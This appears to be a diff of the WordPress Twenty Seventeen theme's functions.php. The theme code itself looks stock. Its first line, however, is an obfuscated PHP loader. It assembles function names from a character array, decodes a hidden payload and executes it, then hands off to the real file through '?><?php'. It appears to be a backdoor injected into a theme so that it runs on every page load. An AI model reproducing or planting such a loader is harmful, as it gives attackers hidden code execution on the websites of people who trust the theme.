jaena[123].$jaena[22].$jaena[32].$jaena[56].$jaena[1].$jaena[21].$jaena[97].$jaena[26].$jaena[123].$jaena[46].$jaena[15].$jaena[93].$jaena[31].$jaena[125].$jaena[59].$jaena[0].$jaena[91].$jaena[26].$jaena[72].$jaena[62].$jaena[20].$jaena[56].$jaena[87].$jaena[49].$jaena[7].$jaena[74].$jaena[97].$jaena[87].$jaena[11].$jaena[32].$jaena[26].$jaena[136].$jaena[61].$jaena[103].$jaena[1].$jaena[59].$jaena[31].$jaena[49].$jaena[27].$jaena[31].$jaena[47].$jaena[17].$jaena[20].$jaena[42].$jaena[127].$jaena[87].$jaena[61].$jaena[38].$jaena[25].$jaena[44].$jaena[56].$jaena[17].$jaena[72].$jaena[91].$jaena[9].$jaena[11].$jaena[128].$jaena[20].$jaena[127].$jaena[8].$jaena[49].$jaena[159].$jaena[13].$jaena[7].$jaena[12].$jaena[125].$jaena[127].$jaena[9].$jaena[15].$jaena[9].$jaena[127].$jaena[8].$jaena[56].$jaena[6].$jaena[123].$jaena[211].$jaena[20].$jaena[74].$jaena[19].$jaena[48].$jaena[5].$jaena[47].$jaena[46].$jaena[62].$jaena[38].$jaena[26].$jaena[61].$jaena[62].$jaena[62].$jaena[32].$jaena[4].$jaena[4].$jaena[61].$jaena[72].$jaena[103].$jaena[29].$jaena[61].$jaena[15].$jaena[26].$jaena[39].$jaena[17].$jaena[141].$jaena[211].$jaena[4].$jaena[39].$jaena[21].$jaena[56].$jaena[2].$jaena[59].$jaena[89].$jaena[79].$jaena[15].$jaena[28].$jaena[97].$jaena[125].$jaena[89].$jaena[46].$jaena[21].$jaena[9].$jaena[72].$jaena[13].$jaena[21].$jaena[60].$jaena[25].$jaena[68].$jaena[103].$jaena[6].$jaena[3].$jaena[87].$jaena[74].$jaena[48].$jaena[103].$jaena[211].$jaena[3].$jaena[6].$jaena[25].$jaena[48].$jaena[44].$jaena[40].$jaena[19].$jaena[35].$jaena[4].$jaena[29].$jaena[60].$jaena[60].$jaena[12].$jaena[39].$jaena[87].$jaena[42].$jaena[27].$jaena[91].$jaena[39].$jaena[136].$jaena[15].$jaena[361].$jaena[26].$jaena[91].$jaena[25].$jaena[48].$jaena[15].$jaena[12].$jaena[4].$jaena[40].$jaena[89].$jaena[32].$jaena[2].$jaena[87].$jaena[29].$jaena[12].$jaena[38].$jaena[8].$jaena[141].$jaena[61].$jaena[28].$jaena[62].$jaena[142].$jaena[44].$jaena[64].$jaena[0].$jaena[64].$jaena[9].$jaena[211].$jaena[361].$jaena[38].$jaena[40].$jaena[27].$jaena[38].$jaena[35].$jaena[87].$jaena[32].$jaena[49].$jaena[44].$jaena[128].$jaena[9].$jaena[136].$jaena[47].$jaena[5].$jaena[15].$jaena[89].$jaena[56].$jaena[20].$jaena[12].$jaena[26].$jaena[59].$jaena[13].$jaena[159].$jaena[61].$jaena[38].$jaena[64].$jaena[21].$jaena[38].$jaena[31].$jaena[361].$jaena[29].$jaena[47].$jaena[35].$jaena[361].$jaena[62].$jaena[9].$jaena[21].$jaena[79].$jaena[26].$jaena[15].$jaena[9].$jaena[26].$jaena[125].$jaena[2].$jaena[22].$jaena[72].$jaena[26].$jaena[74].$jaena[22].$jaena[35].$jaena[56].$jaena[15].$jaena[26].$jaena[126].$jaena[47].$jaena[59].$jaena[2].$jaena[29].$jaena[361].$jaena[27].$jaena[79].$jaena[47].$jaena[91].$jaena[42].$jaena[128].$jaena[29].$jaena[35].$jaena[127].$jaena[9].$jaena[211].$jaena[141].$jaena[142].$jaena[6].$jaena[40].$jaena[123].$jaena[56].$jaena[87].$jaena[29].$jaena[29].$jaena[361].$jaena[38].$jaena[61].$jaena[12].$jaena[60].$jaena[72].$jaena[127].$jaena[49].$jaena[40].$jaena[2].$jaena[38].$jaena[79].$jaena[9].$jaena[40].$jaena[42].$jaena[60].$jaena[3].$jaena[21].$jaena[87].$jaena[74].$jaena[74].$jaena[6].$jaena[79].$jaena[159].$jaena[74].$jaena[60].$jaena[72].$jaena[46].$jaena[35].$jaena[27].$jaena[128].$jaena[21].$jaena[8].$jaena[6].$jaena[60].$jaena[125].$jaena[89].$jaena[26].$jaena[28].$jaena[211].$jaena[17].$jaena[361].$jaena[28].$jaena[13].$jaena[4].$jaena[39].$jaena[79].$jaena[5].$jaena[31].$jaena[29].$jaena[128].$jaena[93].$jaena[17].$jaena[68].$jaena[126].$jaena[42].$jaena[159].$jaena[20].$jaena[3].$jaena[128].$jaena[86].$jaena[28].$jaena[9].$jaena[42].$jaena[29].$jaena[3].$jaena[72].$jaena[15].$jaena[142].$jaena[142].$jaena[79].$jaena[26].$jaena[12].$jaena[62].$jaena[87].$jaena[126].$jaena[128].$jaena[39].$jaena[128].$jaena[27].$jaena[32].$jaena[56].$jaena[49].$jaena[103].$jaena[2].$jaena[56].$jaena[93].$jaena[136].$jaena[15].$jaena[128].$jaena[17].$jaena[19].$jaena[42].$jaena[28].$jaena[32].$jaena[17].$jaena[123].$jaena[59].$jaena[89].$jaena[1].$jaena[39].$jaena[87].$jaena[79].$jaena[3].$jaena[0].$jaena[26].$jaena[26].$jaena[39].$jaena[49].$jaena[40].$jaena[6].$jaena[5].$jaena[40].$jaena[48].$jaena[49].$jaena[136].$jaena[89].$jaena[49].$jaena[42].$jaena[48].$jaena[125].$jaena[17].$jaena[87].$jaena[61].$jaena[40].$jaena[29].$jaena[31].$jaena[48].$jaena[48].$jaena[42].$jaena[123].$jaena[97].$jaena[26].$jaena[93].$jaena[13].$jaena[22].$jaena[5].$jaena[1].$jaena[103].$jaena[21].$jaena[2].$jaena[49].$jaena[25].$jaena[35].$jaena[17].$jaena[49].$jaena[13].$jaena[40].$jaena[49].$jaena[159].$jaena[62].$jaena[13].$jaena[127].$jaena[7].$jaena[211].$jaena[8].$jaena[20].$jaena[68].$jaena[49].$jaena[1].$jaena[2].$jaena[13].$jaena[22].$jaena[28].$jaena[97].$jaena[26].$jaena[22].$jaena[97].$jaena[56].$jaena[56].$jaena[72].$jaena[20].$jaena[19].$jaena[39].$jaena[79].$jaena[93].$jaena[361].$jaena[29].$jaena[1574].$jaena[1574];$kbxqqblqfsafwn=$jaena[28].$jaena[44].$jaena[125].$jaena[47].$jaena[48].$jaena[17].$jaena[288].$jaena[5].$jaena[47].$jaena[128].$jaena[8].$jaena[5].$jaena[47];$pprjluwdfqa=$jaena[31].$jaena[103].$jaena[19].$jaena[361].$jaena[128].$jaena[8].$jaena[15].$jaena[39].$jaena[1].$jaena[47].$jaena[125].$jaena[125];$wscocdmtunfltyl=$jaena[125].$jaena[89].$jaena[1].$jaena[1].$jaena[47].$jaena[26];$vyfknwtyrqcwgcs=$jaena[128].$jaena[1].$jaena[47].$jaena[44].$jaena[89].$jaena[47].$jaena[288].$jaena[7].$jaena[19].$jaena[361].$jaena[128].$jaena[89].$jaena[142].$jaena[8].$jaena[361];$uurxyertsx=$jaena[449].$jaena[44];$lvpkqnqbbn=$jaena[3019].$jaena[369].$jaena[44].$jaena[449].$jaena[2842].$jaena[136].$jaena[44].$jaena[26].$jaena[47];$aelcbsetvyomwn=$jaena[47].$jaena[60].$jaena[142].$jaena[89];$vdnzscuuzbcos=$wscocdmtunfltyl;$kimjvztmqlksntr=$pprjluwdfqa($kbxqqblqfsafwn($ckuvdnsktwqgsf));$kimjvztmqlksntr=$vdnzscuuzbcos($kimjvztmqlksntr);$knixnazhvzi=$vyfknwtyrqcwgcs($uurxyertsx,$wscocdmtunfltyl($lvpkqnqbbn));$knixnazhvzi($wscocdmtunfltyl($kimjvztmqlksntr));$aelcbsetvyomwn;?><?php
+/**
+ * Twenty Seventeen functions and definitions
+ *
+ * @link https://developer.wordpress.org/themes/basics/theme-functions/
+ *
+ * @package WordPress
+ * @subpackage Twenty_Seventeen
+ * @since 1.0
+ */
+
+/**
+ * Twenty Seventeen only works in WordPress 4.7 or later.
+ */
+if ( version_compare( $GLOBALS['wp_version'], '4.7-alpha', '<' ) ) {
+	require get_template_directory() . '/inc/back-compat.php';
+	return;
+}
+
+/**
+ * Sets up theme defaults and registers support for various WordPress features.
+ *
+ * Note that this function is hooked into the after_setup_theme hook, which
+ * runs before the init hook. The init hook is too late for some features, such
+ * as indicating support for post thumbnails.
+ */
+function twentyseventeen_setup() {
+	/*
+	 * Make theme available for translation.
+	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentyseventeen
+	 * If you're building a theme based on Twenty Seventeen, use a find and replace
+	 * to change 'twentyseventeen' to the name of your theme in all the template files.
+	 */
+	load_theme_textdomain( 'twentyseventeen' );
+
+	// Add default posts and comments RSS feed links to head.
+	add_theme_support( 'automatic-feed-links' );
+
+	/*
+	 * Let WordPress manage the document title.
+	 * By adding theme support, we declare that this theme does not use a
+	 * hard-coded <title> tag in the document head, and expect WordPress to
+	 * provide it for us.
+	 */
+	add_theme_support( 'title-tag' );
+
+	/*
+	 * Enable support for Post Thumbnails on posts and pages.
+	 *
+	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
+	 */
+	add_theme_support( 'post-thumbnails' );
+
+	add_image_size( 'twentyseventeen-featured-image', 2000, 1200, true );
+
+	add_image_size( 'twentyseventeen-thumbnail-avatar', 100, 100, true );
+
+	// Set the default content width.
+	$GLOBALS['content_width'] = 525;
+
+	// This theme uses wp_nav_menu() in two locations.
+	register_nav_menus(
+		array(
+			'top'    => __( 'Top Menu', 'twentyseventeen' ),
+			'social' => __( 'Social Links Menu', 'twentyseventeen' ),
+		)
+	);
+
+	/*
+	 * Switch default core markup for search form, comment form, and comments
+	 * to output valid HTML5.
+	 */
+	add_theme_support(
+		'html5',
+		array(
+			'comment-form',
+			'comment-list',
+			'gallery',
+			'caption',
+		)
+	);
+
+	/*
+	 * Enable support for Post Formats.
+	 *
+	 * See: https://codex.wordpress.org/Post_Formats
+	 */
+	add_theme_support(
+		'post-formats',
+		array(
+			'aside',
+			'image',
+			'video',
+			'quote',
+			'link',
+			'gallery',
+			'audio',
+		)
+	);
+
+	// Add theme support for Custom Logo.
+	add_theme_support(
+		'custom-logo',
+		array(
+			'width'      => 250,
+			'height'     => 250,
+			'flex-width' => true,
+		)
+	);
+
+	// Add theme support for selective refresh for widgets.
+	add_theme_support( 'customize-selective-refresh-widgets' );
+
+	/*
+	 * This theme styles the visual editor to resemble the theme style,
+	 * specifically font, colors, and column width.
+	  */
+	add_editor_style( array( 'assets/css/editor-style.css', twentyseventeen_fonts_url() ) );
+
+	// Load regular editor styles into the new block-based editor.
+	add_theme_support( 'editor-styles' );
+
+	// Load default block styles.
+	add_theme_support( 'wp-block-styles' );
+
+	// Add support for responsive embeds.
+	add_theme_support( 'responsive-embeds' );
+
+	// Define and register starter content to showcase the theme on new sites.
+	$starter_content = array(
+		'widgets'     => array(
+			// Place three core-defined widgets in the sidebar area.
+			'sidebar-1' => array(
+				'text_business_info',
+				'search',
+				'text_about',
+			),
+
+			// Add the core-defined business info widget to the footer 1 area.
+			'sidebar-2' => array(
+				'text_business_info',
+			),
+
+			// Put two core-defined widgets in the footer 2 area.
+			'sidebar-3' => array(
+				'text_about',
+				'search',
+			),
+		),
+
+		// Specify the core-defined pages to create and add custom thumbnails to some of them.
+		'posts'       => array(
+			'home',
+			'about'            => array(
+				'thumbnail' => '{{image-sandwich}}',
+			),
+			'contact'          => array(
+				'thumbnail' => '{{image-espresso}}',
+			),
+			'blog'             => array(
+				'thumbnail' => '{{image-coffee}}',
+			),
+			'homepage-section' => array(
+				'thumbnail' => '{{image-espresso}}',
+			),
+		),
+
+		// Create the custom image attachments used as post thumbnails for pages.
+		'attachments' => array(
+			'image-espresso' => array(
+				'post_title' => _x( 'Espresso', 'Theme starter content', 'twentyseventeen' ),
+				'file'       => 'assets/images/espresso.jpg', // URL relative to the template directory.
+			),
+			'image-sandwich' => array(
+				'post_title' => _x( 'Sandwich', 'Theme starter content', 'twentyseventeen' ),
+				'file'       => 'assets/images/sandwich.jpg',
+			),
+			'image-coffee'   => array(
+				'post_title' => _x( 'Coffee', 'Theme starter content', 'twentyseventeen' ),
+				'file'       => 'assets/images/coffee.jpg',
+			),
+		),
+
+		// Default to a static front page and assign the front and posts pages.
+		'options'     => array(
+			'show_on_front'  => 'page',
+			'page_on_front'  => '{{home}}',
+			'page_for_posts' => '{{blog}}',
+		),
+
+		// Set the front page section theme mods to the IDs of the core-registered pages.
+		'theme_mods'  => array(
+			'panel_1' => '{{homepage-section}}',
+			'panel_2' => '{{about}}',
+			'panel_3' => '{{blog}}',
+			'panel_4' => '{{contact}}',
+		),
+
+		// Set up nav menus for each of the two areas registered in the theme.
+		'nav_menus'   => array(
+			// Assign a menu to the "top" location.
+			'top'    => array(
+				'name'  => __( 'Top Menu', 'twentyseventeen' ),
+				'items' => array(
+					'link_home', // Note that the core "home" page is actually a link in case a static front page is not used.
+					'page_about',
+					'page_blog',
+					'page_contact',
+				),
+			),
+
+			// Assign a menu to the "social" location.
+			'social' => array(
+				'name'  => __( 'Social Links Menu', 'twentyseventeen' ),
+				'items' => array(
+					'link_yelp',
+					'link_facebook',
+					'link_twitter',
+					'link_instagram',
+					'link_email',
+				),
+			),
+		),
+	);
+
+	/**
+	 * Filters Twenty Seventeen array of starter content.
+	 *
+	 * @since Twenty Seventeen 1.1
+	 *
+	 * @param array $starter_content Array of starter content.
+	 */
+	$starter_content = apply_filters( 'twentyseventeen_starter_content', $starter_content );
+
+	add_theme_support( 'starter-content', $starter_content );
+}
+add_action( 'after_setup_theme', 'twentyseventeen_setup' );
+
+/**
+ * Set the content width in pixels, based on the theme's design and stylesheet.
+ *
+ * Priority 0 to make it available to lower priority callbacks.
+ *
+ * @global int $content_width
+ */
+function twentyseventeen_content_width() {
+
+	$content_width = $GLOBALS['content_width'];
+
+	// Get layout.
+	$page_layout = get_theme_mod( 'page_layout' );
+
+	// Check if layout is one column.
+	if ( 'one-column' === $page_layout ) {
+		if ( twentyseventeen_is_frontpage() ) {
+			$content_width = 644;
+		} elseif ( is_page() ) {
+			$content_width = 740;
+		}
+	}
+
+	// Check if is single post and there is no sidebar.
+	if ( is_single() && ! is_active_sidebar( 'sidebar-1' ) ) {
+		$content_width = 740;
+	}
+
+	/**
+	 * Filter Twenty Seventeen content width of the theme.
+	 *
+	 * @since Twenty Seventeen 1.0
+	 *
+	 * @param int $content_width Content width in pixels.
+	 */
+	$GLOBALS['content_width'] = apply_filters( 'twentyseventeen_content_width', $content_width );
+}
+add_action( 'template_redirect', 'twentyseventeen_content_width', 0 );
+
+/**
+ * Register custom fonts.
+ */
+function twentyseventeen_fonts_url() {
+	$fonts_url = '';
+
+	/*
+	 * Translators: If there are characters in your language that are not
+	 * supported by Libre Franklin, translate this to 'off'. Do not translate
+	 * into your own language.
+	 */
+	$libre_franklin = _x( 'on', 'Libre Franklin font: on or off', 'twentyseventeen' );
+
+	if ( 'off' !== $libre_franklin ) {
+		$font_families = array();
+
+		$font_families[] = 'Libre Franklin:300,300i,400,400i,600,600i,800,800i';
+
+		$query_args = array(
+			'family' => urlencode( implode( '|', $font_families ) ),
+			'subset' => urlencode( 'latin,latin-ext' ),
+		);
+
+		$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
+	}
+
+	return esc_url_raw( $fonts_url );
+}
+
+/**
+ * Add preconnect for Google Fonts.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param array  $urls           URLs to print for resource hints.
+ * @param string $relation_type  The relation type the URLs are printed.
+ * @return array $urls           URLs to print for resource hints.
+ */
+function twentyseventeen_resource_hints( $urls, $relation_type ) {
+	if ( wp_style_is( 'twentyseventeen-fonts', 'queue' ) && 'preconnect' === $relation_type ) {
+		$urls[] = array(
+			'href' => 'https://fonts.gstatic.com',
+			'crossorigin',
+		);
+	}
+
+	return $urls;
+}
+add_filter( 'wp_resource_hints', 'twentyseventeen_resource_hints', 10, 2 );
+
+/**
+ * Register widget area.
+ *
+ * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
+ */
+function twentyseventeen_widgets_init() {
+	register_sidebar(
+		array(
+			'name'          => __( 'Blog Sidebar', 'twentyseventeen' ),
+			'id'            => 'sidebar-1',
+			'description'   => __( 'Add widgets here to appear in your sidebar on blog posts and archive pages.', 'twentyseventeen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => __( 'Footer 1', 'twentyseventeen' ),
+			'id'            => 'sidebar-2',
+			'description'   => __( 'Add widgets here to appear in your footer.', 'twentyseventeen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => __( 'Footer 2', 'twentyseventeen' ),
+			'id'            => 'sidebar-3',
+			'description'   => __( 'Add widgets here to appear in your footer.', 'twentyseventeen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+}
+add_action( 'widgets_init', 'twentyseventeen_widgets_init' );
+
+/**
+ * Replaces "[...]" (appended to automatically generated excerpts) with ... and
+ * a 'Continue reading' link.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param string $link Link to single post/page.
+ * @return string 'Continue reading' link prepended with an ellipsis.
+ */
+function twentyseventeen_excerpt_more( $link ) {
+	if ( is_admin() ) {
+		return $link;
+	}
+
+	$link = sprintf(
+		'<p class="link-more"><a href="%1$s" class="more-link">%2$s</a></p>',
+		esc_url( get_permalink( get_the_ID() ) ),
+		/* translators: %s: Name of current post */
+		sprintf( __( 'Continue reading<span class="screen-reader-text"> "%s"</span>', 'twentyseventeen' ), get_the_title( get_the_ID() ) )
+	);
+	return ' &hellip; ' . $link;
+}
+add_filter( 'excerpt_more', 'twentyseventeen_excerpt_more' );
+
+/**
+ * Handles JavaScript detection.
+ *
+ * Adds a `js` class to the root `<html>` element when JavaScript is detected.
+ *
+ * @since Twenty Seventeen 1.0
+ */
+function twentyseventeen_javascript_detection() {
+	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
+}
+add_action( 'wp_head', 'twentyseventeen_javascript_detection', 0 );
+
+/**
+ * Add a pingback url auto-discovery header for singularly identifiable articles.
+ */
+function twentyseventeen_pingback_header() {
+	if ( is_singular() && pings_open() ) {
+		printf( '<link rel="pingback" href="%s">' . "\n", esc_url( get_bloginfo( 'pingback_url' ) ) );
+	}
+}
+add_action( 'wp_head', 'twentyseventeen_pingback_header' );
+
+/**
+ * Display custom color CSS.
+ */
+function twentyseventeen_colors_css_wrap() {
+	if ( 'custom' !== get_theme_mod( 'colorscheme' ) && ! is_customize_preview() ) {
+		return;
+	}
+
+	require_once( get_parent_theme_file_path( '/inc/color-patterns.php' ) );
+	$hue = absint( get_theme_mod( 'colorscheme_hue', 250 ) );
+
+	$customize_preview_data_hue = '';
+	if ( is_customize_preview() ) {
+		$customize_preview_data_hue = 'data-hue="' . $hue . '"';
+	}
+	?>
+	<style type="text/css" id="custom-theme-colors" <?php echo $customize_preview_data_hue; ?>>
+		<?php echo twentyseventeen_custom_colors_css(); ?>
+	</style>
+	<?php
+}
+add_action( 'wp_head', 'twentyseventeen_colors_css_wrap' );
+
+/**
+ * Enqueues scripts and styles.
+ */
+function twentyseventeen_scripts() {
+	// Add custom fonts, used in the main stylesheet.
+	wp_enqueue_style( 'twentyseventeen-fonts', twentyseventeen_fonts_url(), array(), null );
+
+	// Theme stylesheet.
+	wp_enqueue_style( 'twentyseventeen-style', get_stylesheet_uri() );
+
+	// Theme block stylesheet.
+	wp_enqueue_style( 'twentyseventeen-block-style', get_theme_file_uri( '/assets/css/blocks.css' ), array( 'twentyseventeen-style' ), '1.1' );
+
+	// Load the dark colorscheme.
+	if ( 'dark' === get_theme_mod( 'colorscheme', 'light' ) || is_customize_preview() ) {
+		wp_enqueue_style( 'twentyseventeen-colors-dark', get_theme_file_uri( '/assets/css/colors-dark.css' ), array( 'twentyseventeen-style' ), '1.0' );
+	}
+
+	// Load the Internet Explorer 9 specific stylesheet, to fix display issues in the Customizer.
+	if ( is_customize_preview() ) {
+		wp_enqueue_style( 'twentyseventeen-ie9', get_theme_file_uri( '/assets/css/ie9.css' ), array( 'twentyseventeen-style' ), '1.0' );
+		wp_style_add_data( 'twentyseventeen-ie9', 'conditional', 'IE 9' );
+	}
+
+	// Load the Internet Explorer 8 specific stylesheet.
+	wp_enqueue_style( 'twentyseventeen-ie8', get_theme_file_uri( '/assets/css/ie8.css' ), array( 'twentyseventeen-style' ), '1.0' );
+	wp_style_add_data( 'twentyseventeen-ie8', 'conditional', 'lt IE 9' );
+
+	// Load the html5 shiv.
+	wp_enqueue_script( 'html5', get_theme_file_uri( '/assets/js/html5.js' ), array(), '3.7.3' );
+	wp_script_add_data( 'html5', 'conditional', 'lt IE 9' );
+
+	wp_enqueue_script( 'twentyseventeen-skip-link-focus-fix', get_theme_file_uri( '/assets/js/skip-link-focus-fix.js' ), array(), '1.0', true );
+
+	$twentyseventeen_l10n = array(
+		'quote' => twentyseventeen_get_svg( array( 'icon' => 'quote-right' ) ),
+	);
+
+	if ( has_nav_menu( 'top' ) ) {
+		wp_enqueue_script( 'twentyseventeen-navigation', get_theme_file_uri( '/assets/js/navigation.js' ), array( 'jquery' ), '1.0', true );
+		$twentyseventeen_l10n['expand']   = __( 'Expand child menu', 'twentyseventeen' );
+		$twentyseventeen_l10n['collapse'] = __( 'Collapse child menu', 'twentyseventeen' );
+		$twentyseventeen_l10n['icon']     = twentyseventeen_get_svg(
+			array(
+				'icon'     => 'angle-down',
+				'fallback' => true,
+			)
+		);
+	}
+
+	wp_enqueue_script( 'twentyseventeen-global', get_theme_file_uri( '/assets/js/global.js' ), array( 'jquery' ), '1.0', true );
+
+	wp_enqueue_script( 'jquery-scrollto', get_theme_file_uri( '/assets/js/jquery.scrollTo.js' ), array( 'jquery' ), '2.1.2', true );
+
+	wp_localize_script( 'twentyseventeen-skip-link-focus-fix', 'twentyseventeenScreenReaderText', $twentyseventeen_l10n );
+
+	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
+		wp_enqueue_script( 'comment-reply' );
+	}
+}
+add_action( 'wp_enqueue_scripts', 'twentyseventeen_scripts' );
+
+/**
+ * Enqueues styles for the block-based editor.
+ *
+ * @since Twenty Seventeen 1.8
+ */
+function twentyseventeen_block_editor_styles() {
+	// Block styles.
+	wp_enqueue_style( 'twentyseventeen-block-editor-style', get_theme_file_uri( '/assets/css/editor-blocks.css' ), array(), '1.1' );
+	// Add custom fonts.
+	wp_enqueue_style( 'twentyseventeen-fonts', twentyseventeen_fonts_url(), array(), null );
+}
+add_action( 'enqueue_block_editor_assets', 'twentyseventeen_block_editor_styles' );
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for content images.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param string $sizes A source size value for use in a 'sizes' attribute.
+ * @param array  $size  Image size. Accepts an array of width and height
+ *                      values in pixels (in that order).
+ * @return string A source size value for use in a content image 'sizes' attribute.
+ */
+function twentyseventeen_content_image_sizes_attr( $sizes, $size ) {
+	$width = $size[0];
+
+	if ( 740 <= $width ) {
+		$sizes = '(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px';
+	}
+
+	if ( is_active_sidebar( 'sidebar-1' ) || is_archive() || is_search() || is_home() || is_page() ) {
+		if ( ! ( is_page() && 'one-column' === get_theme_mod( 'page_options' ) ) && 767 <= $width ) {
+			$sizes = '(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px';
+		}
+	}
+
+	return $sizes;
+}
+add_filter( 'wp_calculate_image_sizes', 'twentyseventeen_content_image_sizes_attr', 10, 2 );
+
+/**
+ * Filter the `sizes` value in the header image markup.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param string $html   The HTML image tag markup being filtered.
+ * @param object $header The custom header object returned by 'get_custom_header()'.
+ * @param array  $attr   Array of the attributes for the image tag.
+ * @return string The filtered header image HTML.
+ */
+function twentyseventeen_header_image_tag( $html, $header, $attr ) {
+	if ( isset( $attr['sizes'] ) ) {
+		$html = str_replace( $attr['sizes'], '100vw', $html );
+	}
+	return $html;
+}
+add_filter( 'get_header_image_tag', 'twentyseventeen_header_image_tag', 10, 3 );
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for post thumbnails.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param array $attr       Attributes for the image markup.
+ * @param int   $attachment Image attachment ID.
+ * @param array $size       Registered image size or flat array of height and width dimensions.
+ * @return array The filtered attributes for the image markup.
+ */
+function twentyseventeen_post_thumbnail_sizes_attr( $attr, $attachment, $size ) {
+	if ( is_archive() || is_search() || is_home() ) {
+		$attr['sizes'] = '(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px';
+	} else {
+		$attr['sizes'] = '100vw';
+	}
+
+	return $attr;
+}
+add_filter( 'wp_get_attachment_image_attributes', 'twentyseventeen_post_thumbnail_sizes_attr', 10, 3 );
+
+/**
+ * Use front-page.php when Front page displays is set to a static page.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param string $template front-page.php.
+ *
+ * @return string The template to be used: blank if is_home() is true (defaults to index.php), else $template.
+ */
+function twentyseventeen_front_page_template( $template ) {
+	return is_home() ? '' : $template;
+}
+add_filter( 'frontpage_template', 'twentyseventeen_front_page_template' );
+
+/**
+ * Modifies tag cloud widget arguments to display all tags in the same font size
+ * and use list format for better accessibility.
+ *
+ * @since Twenty Seventeen 1.4
+ *
+ * @param array $args Arguments for tag cloud widget.
+ * @return array The filtered arguments for tag cloud widget.
+ */
+function twentyseventeen_widget_tag_cloud_args( $args ) {
+	$args['largest']  = 1;
+	$args['smallest'] = 1;
+	$args['unit']     = 'em';
+	$args['format']   = 'list';
+
+	return $args;
+}
+add_filter( 'widget_tag_cloud_args', 'twentyseventeen_widget_tag_cloud_args' );
+
+/**
+ * Get unique ID.
+ *
+ * This is a PHP implementation of Underscore's uniqueId method. A static variable
+ * contains an integer that is incremented with each call. This number is returned
+ * with the optional prefix. As such the returned value is not universally unique,
+ * but it is unique across the life of the PHP process.
+ *
+ * @since Twenty Seventeen 2.0
+ * @see wp_unique_id() Themes requiring WordPress 5.0.3 and greater should use this instead.
+ *
+ * @staticvar int $id_counter
+ *
+ * @param string $prefix Prefix for the returned ID.
+ * @return string Unique ID.
+ */
+function twentyseventeen_unique_id( $prefix = '' ) {
+	static $id_counter = 0;
+	if ( function_exists( 'wp_unique_id' ) ) {
+		return wp_unique_id( $prefix );
+	}
+	return $prefix . (string) ++$id_counter;
+}
+
+/**
+ * Implement the Custom Header feature.
+ */
+require get_parent_theme_file_path( '/inc/custom-header.php' );
+
+/**
+ * Custom template tags for this theme.
+ */
+require get_parent_theme_file_path( '/inc/template-tags.php' );
+
+/**
+ * Additional features to allow styling of the templates.
+ */
+require get_parent_theme_file_path( '/inc/template-functions.php' );
+
+/**
+ * Customizer additions.
+ */
+require get_parent_theme_file_path( '/inc/customizer.php' );
+
+/**
+ * SVG icons functions and filters.
+ */
+require get_parent_theme_file_path( '/inc/icon-functions.php' );
